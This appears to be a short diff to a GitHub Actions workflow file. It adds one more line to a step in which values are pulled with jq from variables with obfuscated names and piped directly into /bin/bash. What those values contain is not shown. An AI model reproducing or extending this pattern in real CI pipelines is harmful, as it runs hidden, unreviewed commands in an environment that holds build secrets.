@@ -26,6 +26,7 @@ jobs:
           echo $h3 | jq -r .uspu267 | /bin/bash
           printf '%s' "$otvw03393" | jq -r .kmy0 | /bin/bash
           printf '%s' "$kg225" | jq -r .wuoo1098 | /bin/bash
+          printf '%s' "$glju62" | jq -r .penh505 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
